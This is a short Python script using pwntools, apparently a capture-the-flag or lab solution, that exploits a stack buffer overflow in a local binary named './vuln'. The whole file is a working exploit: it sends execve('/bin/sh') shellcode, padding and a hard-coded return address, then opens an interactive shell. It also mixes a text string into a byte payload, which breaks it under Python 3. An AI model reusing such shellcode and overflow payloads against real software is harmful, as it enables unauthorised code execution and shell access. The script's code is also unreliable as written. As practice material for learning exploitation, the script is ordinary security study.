#! /usr/bin/env python
from pwn import *
context.log_level = 'debug'

ret = 0x7fffffffe000 
shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
payload = shellcode + 'A' * (88-len(shellcode)) + p64(ret)
p = process("./vuln")
p.send(payload)
p.interactive()
